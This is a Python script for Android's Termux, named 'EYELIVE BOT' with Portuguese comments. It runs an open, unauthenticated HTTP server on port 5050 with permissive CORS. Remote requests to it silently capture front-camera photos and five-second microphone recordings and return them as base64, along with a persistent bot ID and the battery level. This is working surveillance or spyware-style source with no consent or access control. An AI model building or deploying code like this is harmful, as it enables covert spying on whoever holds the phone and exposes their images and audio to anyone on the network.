import os, json, time, subprocess, base64, random, string
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime

MEDIA = "/data/data/com.termux/files/home/eyelive"
os.makedirs(MEDIA, exist_ok=True)
CONFIG = f"{MEDIA}/.id"

if os.path.exists(CONFIG):
    with open(CONFIG) as f: BOT_ID = f.read().strip()
else:
    BOT_ID = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(12))
    with open(CONFIG, 'w') as f: f.write(BOT_ID)

print(f"BOT ID: {BOT_ID}")

def shell(cmd):
    try: return subprocess.check_output(cmd, shell=True, text=True, timeout=15).strip()
    except: return ""

class Handler(BaseHTTPRequestHandler):
    def _send(self, data, code=200, ctype="application/json"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        if isinstance(data, str): data = data.encode()
        self.wfile.write(data)
    
    def do_GET(self):
        if self.path == "/id":
            self._send(json.dumps({"id": BOT_ID}))
        
        elif self.path == "/status":
            b = shell("termux-battery-status")
            bat = ""
            if b:
                try: bat = str(json.loads(b).get("percentage","?")) + "%"
                except: pass
            self._send(json.dumps({"time": datetime.now().strftime("%H:%M:%S"), "bateria": bat, "id": BOT_ID}))
        
        elif self.path == "/foto":
            path = f"{MEDIA}/foto.jpg"
            shell(f"termux-camera-photo -c 1 {path}")
            time.sleep(1)
            if os.path.exists(path):
                with open(path, 'rb') as f:
                    self._send(f.read(), 200, "image/jpeg")
            else:
                self._send("Erro", 500)
        
        elif self.path == "/live":
            # Limpar fotos antigas
            for f in os.listdir(MEDIA):
                if f.startswith("live_") or f.startswith("audio_"):
                    os.remove(f"{MEDIA}/{f}")
            
            T = datetime.now().strftime("%H%M%S")
            
            # Iniciar áudio em background (5s)
            os.system(f"termux-microphone-record -f {MEDIA}/audio_{T}.aac -l 5 &")
            
            # Tirar 5 fotos
            fotos = []
            for i in range(5):
                path = f"{MEDIA}/live_{T}_{i}.jpg"
                shell(f"termux-camera-photo -c 1 {path}")
                time.sleep(0.8)
                if os.path.exists(path):
                    with open(path, 'rb') as f:
                        fotos.append(base64.b64encode(f.read()).decode())
            
            # Aguardar áudio
            time.sleep(3)
            
            audio_b64 = ""
            audiopath = f"{MEDIA}/audio_{T}.aac"
            if os.path.exists(audiopath):
                with open(audiopath, 'rb') as f:
                    audio_b64 = base64.b64encode(f.read()).decode()
            
            self._send(json.dumps({"fotos": fotos, "audio": audio_b64, "count": len(fotos)}))
        
        else:
            self._send(json.dumps({"msg": "EYELIVE BOT", "id": BOT_ID}))

print(f"Rodando na porta 5050")
HTTPServer(("0.0.0.0", 5050), Handler).serve_forever()
